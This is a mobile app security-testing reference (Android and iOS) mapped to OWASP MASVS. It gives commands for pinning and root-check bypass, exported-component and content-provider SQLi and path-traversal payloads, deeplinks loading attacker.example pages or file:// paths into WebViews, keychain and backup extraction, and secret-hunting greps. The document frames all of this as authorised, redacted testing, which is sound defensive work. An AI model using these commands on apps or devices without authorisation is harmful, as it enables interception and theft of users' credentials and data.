# Mobile attack reference (Android + iOS)
# Approval-gated. AUTHORIZED app + test device only. Benign proof. REDACT all secrets/keys/tokens in artifacts.
# Map findings to OWASP MASVS controls (STORAGE / CRYPTO / AUTH / NETWORK / PLATFORM / CODE / RESILIENCE).

## Static analysis (first pass)
```
# Android:
unzip app.apk -d app_src                         # inspect resources, assets, lib/
apktool d app.apk -o app_apktool                 # smali + decoded AndroidManifest.xml
jadx -d app_jadx app.apk                         # decompile to Java
# iOS (.ipa is a zip): Payload/<App>.app/ -> Info.plist, embedded.mobileprovision, Frameworks/
# Automated triage: MobSF (static) surfaces manifest flags, secrets, insecure API usage.
```
Read in the manifest/Info.plist: exported components, URL schemes/deeplinks, `android:debuggable`,
`android:allowBackup`, cleartext-traffic flag / ATS exceptions, requested permissions, min-SDK.

## Insecure local storage  (MASVS-STORAGE)
- Android: `shared_prefs/*.xml`, `databases/*.sqlite`, `files/`, external storage — look for tokens,
  passwords, PII, keys stored in plaintext or with a hardcoded/derivable key.
- iOS: `NSUserDefaults` plist, app `Documents/`/`Library/` sqlite, Keychain items with weak
  accessibility (`kSecAttrAccessibleAlways`). Check Keychain entries aren't world-persistent.
```
# Live inspection on a test device:
objection -g <pkg> explore                        # then: android keystore list / ios keychain dump
adb shell run-as <pkg> cat shared_prefs/<file>.xml
```
Benign proof: read ONE stored secret (redact it to a fingerprint). Do not dump the whole store.

## Traffic interception + TLS / cert-pinning bypass  (MASVS-NETWORK)
```
# 1. Route app traffic through Burp (install CA on the test device / emulator).
# 2. If traffic fails (pinned), bypass pinning with instrumentation:
objection -g <pkg> explore -s "android sslpinning disable"      # Android
objection -g <bundle> explore -s "ios sslpinning disable"       # iOS
frida -U -f <pkg> -l pinning_bypass.js --no-pause               # custom hook on the pinning API
```
Benign proof: show ONE request/response flowing through the proxy after the bypass; confirm whether
cleartext or weak TLS is also accepted. Note endpoints that transmit credentials/PII.

## Exported components  (MASVS-PLATFORM)
Activities / services / broadcast receivers / content providers marked exported (or with an intent-filter
and no permission) are reachable by any app on the device.
```
# Enumerate from the manifest (exported="true" or implicit via intent-filter, no signature permission).
adb shell am start -n <pkg>/<activity> --es key value          # launch an exported activity
adb shell am startservice -n <pkg>/<service>
adb shell am broadcast -a <action> --es key value              # fire into an exported receiver
content query --uri content://<authority>/<path>               # query an exported provider (SQLi/path-traversal?)
```
Benign proof: invoke ONE exported component to trigger a benign, observable effect (a screen that should
require auth, a provider row, an action performed without permission).

## Insecure deeplinks / URL schemes  (MASVS-PLATFORM)
- Custom scheme (`myapp://`) or App Links / Universal Links that pass data into sensitive flows without
  validation → parameter injection, auth-context confusion, WebView loading of an attacker URL.
```
adb shell am start -a android.intent.action.VIEW -d "myapp://path?next=https://attacker.example"
# iOS: open the scheme from Safari / a note to observe handling.
```
Benign proof: show a deeplink reaching a sensitive handler / loading an attacker-chosen value.

## Hardcoded secrets / keys  (MASVS-CRYPTO / CODE)
Grep decompiled source + resources for API keys, cloud creds, signing keys, encryption keys, backend
URLs, and secrets in `strings.xml`/`BuildConfig`/`Info.plist`. Validate impact of a live key out-of-band
and redact it. A key that only unlocks client-side obfuscation is lower severity than a live backend cred.

## Insecure WebView  (MASVS-PLATFORM)
- `setJavaScriptEnabled(true)` + `addJavascriptInterface(obj, "name")` exposes native methods to page JS —
  an attacker-controlled page (via deeplink/redirect/XSS) can call them.
- `setAllowFileAccess`/`setAllowUniversalAccessFromFileURLs` + loading `file://` → local file read.
- Loading mixed/attacker content over http, or ignoring TLS errors (`onReceivedSslError` proceed).
Benign proof: reach a JS-bridge method or read a benign local file from an attacker-influenced page.

## Root / jailbreak-detection bypass  (MASVS-RESILIENCE)
If root/jailbreak checks gate functionality, hook them to show the control is bypassable:
```
objection -g <pkg> explore -s "android root disable"
frida -U -f <pkg> -l rootbypass.js --no-pause           # hook the detection method -> return false
```
This is a resilience (defence-in-depth) finding — rate honestly; it is not by itself a data-access issue.

## Backup + clipboard leakage  (MASVS-STORAGE)
- `android:allowBackup="true"` → `adb backup` may extract app data on older devices.
- Sensitive fields copied to the system clipboard (no `FLAG_SECURE` / no clipboard clearing) → readable by
  other apps. Screenshots of sensitive screens (no secure flag) persist in recents.

## Reporting
Each finding: platform, MASVS control, the component/path/endpoint, the vector, the benign proof (redacted),
attacker preconditions (rooted device? co-located app? physical access?), and remediation. Never ship the
repackaged/instrumented build or raw user data in artifacts.

---

## Extended arsenal — Android dynamic instrumentation (frida / objection)  (MASVS-CRYPTO / AUTH / RESILIENCE)
```
frida-ps -Uai                                     # list installed apps + pids on the USB test device
frida -U -f <pkg> -l hooks.js --no-pause          # spawn pkg, inject script, resume
objection -g <pkg> explore                         # interactive REPL (frida-server/gadget on device)
```
`frida-trace` — auto-stub an API family, then edit the generated handlers to log args/returns:
```
frida-trace -U -f <pkg> -j 'javax.crypto.Cipher!*'            # all Cipher methods (Java)
frida-trace -U -f <pkg> -j 'javax.crypto.spec.*KeySpec!$init' # key construction
frida-trace -U -f <pkg> -j 'java.security.MessageDigest!*'    # hashing usage
frida-trace -U -f <bundle> -i 'CCCrypt' -i 'SecItem*'         # iOS native crypto / keychain (C/ObjC)
```
Crypto-API logging (objection one-liners — log, do not exfiltrate):
```
objection -g <pkg> explore -s "android hooking watch class javax.crypto.Cipher"
objection -g <pkg> explore -s "android hooking watch class_method javax.crypto.Cipher.doFinal --dump-args --dump-return"
```
```js
// crypto_log.js — algorithm + KEY FINGERPRINT only; never print raw key/IV material
Java.perform(function () {
  var SKS = Java.use('javax.crypto.spec.SecretKeySpec');
  SKS.$init.overload('[B', 'java.lang.String').implementation = function (k, alg) {
    console.log('[key] alg=' + alg + ' keyfp=' + fp(k));   // fp() = sha256(bytes)[:8]
    return this.$init(k, alg);
  };
});
```
Keystore / KeyChain usage:
```
objection -g <pkg> explore -s "android keystore list"             # AndroidKeyStore aliases
objection -g <pkg> explore -s "android hooking watch class java.security.KeyStore"
# Flag: setUserAuthenticationRequired(false), no StrongBox, or secrets kept OUTSIDE the keystore.
```
Biometric gate bypass (AUTH/RESILIENCE) — proves the gate is client-side only:
```
frida -U -f <pkg> -l biobypass.js --no-pause
# Hook androidx.biometric.BiometricPrompt$AuthenticationCallback.onAuthenticationSucceeded,
# or the boolean the app checks after auth, and force the success path.
# HONESTY: if the gate releases a Keystore key via a CryptoObject, a callback-only hook does NOT
# unlock it — say so; that is a stronger control than a bare boolean check.
```
WebView bridge enumeration:
```
objection -g <pkg> explore -s "android hooking search methods addJavascriptInterface"
# Or hook WebView.addJavascriptInterface(obj,name) to log every (object,name) pair exposed to page JS.
```
Custom root / pinning hooks (when the universal scripts miss a bespoke check):
```
objection -g <pkg> explore -s "android hooking search methods <keyword>"   # find isRooted/checkPin/etc.
# Hook the specific method -> return false / no-op; prove the control is defeated.
```
Memory string dumps (APPROVAL-GATED — may hold PII; keep off-artifact, strings-grep, then delete):
```
objection -g <pkg> explore -s "memory search --string '<benign-marker>'"   # locate a test marker in RAM
objection -g <pkg> explore -s "memory list modules"
# frida: Process.enumerateRanges('rw-') + Memory.scan for a KNOWN test token only.
# Benign proof = find ONE test marker you planted; do NOT dump the full heap into artifacts.
```

---

## Extended arsenal — IPC & component fuzzing  (MASVS-PLATFORM)
Content providers — query / update / SQLi / path traversal (read-only proof; writes catalogued):
```
adb shell content query  --uri content://<authority>/<path>
adb shell content query  --uri content://<authority>/<path> --projection name,value --where "1=1"
# SQLi in selection (benign: count/boolean differential only):  --where "1=1) UNION SELECT 1 --"
# File-backed provider traversal via openFile():
adb shell content read   --uri content://<authority>/../../../databases/<db>
# DESTRUCTIVE — CATALOGUE, DO NOT FIRE on real data: content insert / update / delete mutate the store.
```
drozer provider + attack-surface workflow:
```
drozer console connect
run app.package.attacksurface <pkg>
run app.provider.info      -a <pkg>
run app.provider.finduri   <pkg>
run scanner.provider.injection -a <pkg>     # provider SQLi
run scanner.provider.traversal -a <pkg>     # provider path traversal
run app.provider.read content://<authority>/<path>     # benign: read ONE row/file
```
grantUriPermission abuse: a provider that grants ad-hoc URI perms (or `android:grantUriPermissions="true"`)
can hand a co-located app read access to private files. Benign proof: show one private file reachable via a
granted `content://` URI from a second test app; catalogue, do not exfiltrate real user data.
Intent fuzzing into exported activities / services / receivers:
```
drozer: run app.activity.start  --component <pkg> <activity> --extra string next content://evil
drozer: run app.service.start   --component <pkg> <service>
drozer: run app.broadcast.send  --component <pkg> <receiver> --extra string key value
adb shell am start -n <pkg>/<activity> --ez admin true --es next 'content://x'   # inject/overload extras
# Fuzz extras: null / empty / overlong / wrong-type. Watch: adb logcat for crashes or state changes.
# DoS (receiver/service crash storms) = CATALOGUE, do not loop-fire against production.
```
PendingIntent hijack (awareness / catalogue): a mutable PendingIntent (`getActivity/getBroadcast(...,0)`
with no `FLAG_IMMUTABLE`, pre-API-31 defaults) handed to another app lets the recipient fill the blank
Intent and fire it with the issuer's identity/permissions. Benign proof = identify the mutable-PI export
path; do not weaponize.
Implicit-intent interception: sensitive data sent via an implicit Intent (action, no explicit component) can
be caught by a malicious app registering the same action. Benign proof = register a receiver on the test
device, observe the extras arrive (redact); catalogue, do not harvest real data.

---

## Extended arsenal — Deeplink → WebView chains  (MASVS-PLATFORM)
```
# Untrusted deeplink URL flows into an exported WebView loadUrl():
adb shell am start -a android.intent.action.VIEW -d "myapp://web?url=https://attacker.example/x.html"
# If that WebView has addJavascriptInterface, the attacker page reaches the native bridge:
#   <script>window.<bridge>.<method>()</script>   -> benign call returning a benign observable = reach proven
# file:// / content:// load (setAllowFileAccess[FromFileURLs] / UniversalAccess):
adb shell am start -a android.intent.action.VIEW -d "myapp://web?url=file:///data/data/<pkg>/shared_prefs/<f>.xml"
# Benign proof = read ONE benign local file, or reach ONE bridge method.
```
App-link / Universal-link verification gaps:
```
adb shell pm get-app-links <pkg>                 # android:autoVerify state: verified / 1024(none) / failure
adb shell dumpsys package domain-preferred-apps  # which domains actually map to the app
# assetlinks:  https://<domain>/.well-known/assetlinks.json  must list the app's sha256 signing-cert fp
# iOS AASA:    https://<domain>/.well-known/apple-app-site-association
```
Gap = domain claimable / AASA missing or wildcard / autoVerify failed → link hijack or an unverified deeplink
reaching a sensitive handler.

---

## Extended arsenal — Network-security-config, ATS & per-framework pinning  (MASVS-NETWORK)
```
# Android network-security-config (manifest android:networkSecurityConfig -> res/xml/*.xml):
#   cleartextTrafficPermitted="true"            -> cleartext allowed (which domains?)
#   <certificates src="user"/>                   -> user CA trusted (weak posture)
#   <pin-set>                                    -> static pins (expiry? backup pin present?)
#   application android:usesCleartextTraffic="true" (pre-NSC global fallback)
# iOS ATS (Info.plist NSAppTransportSecurity):
#   NSAllowsArbitraryLoads=true / NSExceptionDomains / NSExceptionAllowsInsecureHTTPLoads -> cleartext gaps
```
Where each framework's pinning is bypassed (objection/frida universals cover only the first rows):

| Stack | Pinning mechanism | Bypass point |
|---|---|---|
| Native Java | `X509TrustManager` / `TrustManagerFactory` | hook `checkServerTrusted` → return; swap in all-trust TM |
| OkHttp | `okhttp3.CertificatePinner.check()` | hook `check*` → no-op |
| HttpsURLConnection | custom `HostnameVerifier` + TM | hook `setDefaultHostnameVerifier` + `checkServerTrusted` |
| Flutter / Dart | BoringSSL in `libflutter.so` (ignores system store + proxy) | hook `ssl_crypto_x509_session_verify_cert_chain` in libflutter.so; force in-app proxy |
| React Native | native OkHttp stack (+ optional RN-ssl-pinning) | OkHttp hook; RN honors the system proxy |
| Xamarin | Mono BoringSSL / `ServerCertificateValidationCallback` | hook the validation callback in libmonosgen; set in-app proxy (ignores system proxy) |
| Cordova / Ionic | system-WebView + plugin pinning | WebView uses system stack → standard objection bypass |

mTLS client-cert extraction (APPROVAL-GATED, redacted):
```
adb shell run-as <pkg> ls files/                 # locate *.p12 / *.pfx / *.keystore in the sandbox
# load password is often hardcoded: grep smali for KeyStore.load / "PKCS12"
openssl pkcs12 -in client.p12 -nokeys -clcerts -passin pass:<redacted>   # SHOW cert subject/serial only
# Benign proof = print cert subject + serial + sha256 fingerprint; REDACT/keep key material; do not reuse it.
```

---

## Extended arsenal — Storage depth (paths, keychain, SQLite residue, backup)  (MASVS-STORAGE)
Android exact locations:
```
/data/data/<pkg>/shared_prefs/*.xml
/data/data/<pkg>/databases/*.db   (+ *-wal, *-shm, *-journal)
/data/data/<pkg>/files/  cache/  no_backup/
/data/user/0/<pkg>/...                        # multi-user alias of the above
/sdcard/Android/data/<pkg>/                   # external app-specific dir
content://media/external/...                  # MediaStore — files written to shared media
```
```
adb shell run-as <pkg> cat databases/<db> | base64 > db.b64   # pull ONE test-account db for inspection
sqlite3 <db> ".tables"
strings <db>-wal <db>-journal | grep -Ei 'token|email|pass'   # residue: "deleted" rows persist in WAL/journal + free pages
# APPROVAL-GATED if the db holds real PII — inspect test-account rows, redact, delete the local copy after.
```
iOS keychain dump + accessibility classes:
```
objection -g <bundle> explore -s "ios keychain dump"
# Rate each item by accessibility class:
#   kSecAttrAccessibleAlways[ThisDeviceOnly]              -> weakest (readable while locked) [deprecated, still seen]
#   kSecAttrAccessibleAfterFirstUnlock[ThisDeviceOnly]   -> survives lock after first unlock (background use)
#   kSecAttrAccessibleWhenUnlocked[ThisDeviceOnly]       -> baseline
#   kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly      -> strongest
#   kSecAttrSynchronizable=true                          -> item syncs to iCloud Keychain (should a secret?)
```
Backup extraction:
```
# android:allowBackup="true" and no fullBackupContent exclusions:
adb backup -f app.ab -apk <pkg>                               # where still supported
dd if=app.ab bs=1 skip=24 | zlib-flate -uncompress > app.tar  # strip 24-byte header, inflate
tar xf app.tar                                                # -> apps/<pkg>/{sp,db,f}/ private files
# Benign proof = extract + read ONE file to show data leaves the sandbox; redact.
```
Log / pasteboard leakage:
```
adb logcat --pid $(adb shell pidof -s <pkg>) | grep -Ei 'token|password|authorization'   # plaintext in logs?
# iOS: UIPasteboard.general persists across apps — check sensitive copies with no expiry/clear.
```
Benign proof (all): read ONE stored/residual/logged value → fingerprint; redact; never dump the whole store.

---

## Extended arsenal — Secrets & binary analysis  (MASVS-CODE / CRYPTO)
```
# Smali + resources sweep:
grep -rEi 'api[_-]?key|secret|password|token|AKIA[0-9A-Z]{16}|BEGIN (RSA|EC|PRIVATE)' app_jadx/ app_apktool/
grep -rEi 'https?://' app_apktool/res/ app_apktool/smali*/          # backend/staging URLs
# Also: BuildConfig fields, strings.xml, raw/assets, *.properties, google-services.json
# Native libs:
strings -n 8 lib/<abi>/lib*.so | grep -Ei 'key|token|http|secret'
nm -D lib/<abi>/lib*.so ; readelf -d lib/<abi>/lib*.so              # exports / deps
# De-obfuscation awareness: strings decrypted at RUNTIME won't appear statically ->
#   hook the decrypt routine or memory-search for them dynamically instead of static grep.
```
iOS binary:
```
otool -l <App.app>/<App> | grep -A5 LC_ENCRYPTION_INFO             # cryptid 1 = still FairPlay-encrypted
# -> decrypt from memory on the jailbroken TEST device first, then:
class-dump -H <App.app>/<App> -o headers/                          # ObjC class/method surface
strings -n 8 <App.app>/<App> | grep -Ei 'key|token|https'
# Swift: class-dump is limited -> Ghidra + demangle. Inspect <App.app>/Frameworks/*.framework the same way.
```
Every secret → fingerprint (`sha256(secret)[:8]`), validate impact out-of-band, redact in artifacts.

---

## Extended arsenal — MASVS control → test → benign-proof map

| MASVS | Test | Benign proof (redacted) |
|---|---|---|
| STORAGE-1/2 | plaintext secrets in prefs/db/keychain | read ONE secret → fingerprint |
| STORAGE (residue) | SQLite WAL/journal, logcat, pasteboard, backup | one residual/logged value shown redacted |
| CRYPTO-1/2 | hardcoded keys, weak cipher/mode, static IV | log one alg + key fingerprint via hook |
| AUTH (local) | biometric/PIN gate client-side only | force the gate's success path (note CryptoObject caveat) |
| NETWORK-1 | interception after pinning bypass | one request through the proxy post-bypass |
| NETWORK-2 | cleartext / ATS / NSC gaps | show one cleartext-permitted domain/endpoint |
| NETWORK (mTLS) | client cert extractable | print cert subject + fp, key redacted |
| PLATFORM-1 | exported activity/service/receiver | invoke one → benign observable effect |
| PLATFORM (provider) | content:// query/SQLi/traversal/grantUri | read one row/file via the provider |
| PLATFORM-2 (WebView) | deeplink→WebView, JS bridge, file:// load | reach one bridge method / read one local file |
| PLATFORM (app-link) | scheme/AASA/assetlinks verification gap | one deeplink reaches a sensitive handler |
| CODE-2 | hardcoded secrets in smali/native/resources | one secret fingerprinted, impact OOB |
| RESILIENCE-1..4 | root/JB detection, anti-hook, anti-debug | hook the check → bypassed (defence-in-depth; rate honestly) |
